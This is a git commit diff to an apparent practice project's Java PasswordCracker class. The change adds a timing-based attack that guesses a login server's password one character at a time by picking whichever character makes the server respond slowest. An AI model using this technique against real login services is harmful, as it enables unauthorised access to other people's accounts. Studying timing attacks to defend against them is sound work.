c72fa32a3b3b98596248904376122a27ce558b4a
Douglas Vieira <douglasdotv@hotmail.com>
2023-05-02 02:04:52 -0300

    Find the password through time-based vulnerability

--- src/main/java/br/com/dv/passwordcracker/PasswordCracker.java
+++ src/main/java/br/com/dv/passwordcracker/PasswordCracker.java
@@ -19,25 +19,25 @@ public class PasswordCracker {
             return;
         }
 
-        Account account = findAccountCredentials(inputData.ipAddress(), inputData.port());
+        Account account = bruteForce(inputData.ipAddress(), inputData.port());
+
         JsonUtils.printJson(account);
     }
 
-    private Account findAccountCredentials(String ipAddress, int port) {
+    private Account bruteForce(String ipAddress, int port) {
         try (Socket socket = new Socket(ipAddress, port);
              DataInputStream input = new DataInputStream(socket.getInputStream());
              DataOutputStream output = new DataOutputStream(socket.getOutputStream())) {
 
             String login = findLogin(input, output);
             if (login == null) {
-                throw new RuntimeException("Login could not be found!");
+                throw new RuntimeException("Login not found!");
             }
 
             String password = findPassword(input, output, login);
 
             return new Account(login, password);
         } catch (Exception e) {
-            System.out.println("An error occurred while trying to find account credentials: " + e.getMessage());
             e.printStackTrace();
             return null;
         }
@@ -64,6 +64,10 @@ public class PasswordCracker {
         return null;
     }
 
+    /*
+     * Each character of the password needs to be tested individually.
+     * If the server takes longer to respond, it means that the character is correct.
+     */
     private String findPassword(DataInputStream input, DataOutputStream output, String login) throws IOException {
         StringBuilder password = new StringBuilder();
 
@@ -72,24 +76,32 @@ public class PasswordCracker {
                 .mapToObj(c -> (char) c)
                 .toList();
 
-        outerLoop:
         while (true) {
+            long maxTime = -1;
+            Character maxChar = null;
+
             for (Character c : characterList) {
                 String testPassword = password.toString() + c;
                 Account account = new Account(login, testPassword);
-                ServerResponse response = sendLoginAndPassword(input, output, account);
-                String result = getResult(response);
 
-                if (result.equals(ServerResponseType.EXCEPTION.result)) {
-                    password.append(c);
-                    continue outerLoop;
-                }
+                long startTime = System.nanoTime();
+                ServerResponse response = sendLoginAndPassword(input, output, account);
+                long endTime = System.nanoTime();
+                long duration = endTime - startTime;
+
+                String result = getResult(response);
 
                 if (result.equals(ServerResponseType.CONNECTION_SUCCESS.result)) {
                     password.append(c);
                     return password.toString();
                 }
+
+                if (duration > maxTime) {
+                    maxTime = duration;
+                    maxChar = c;
+                }
             }
+            password.append(maxChar);
         }
     }
 
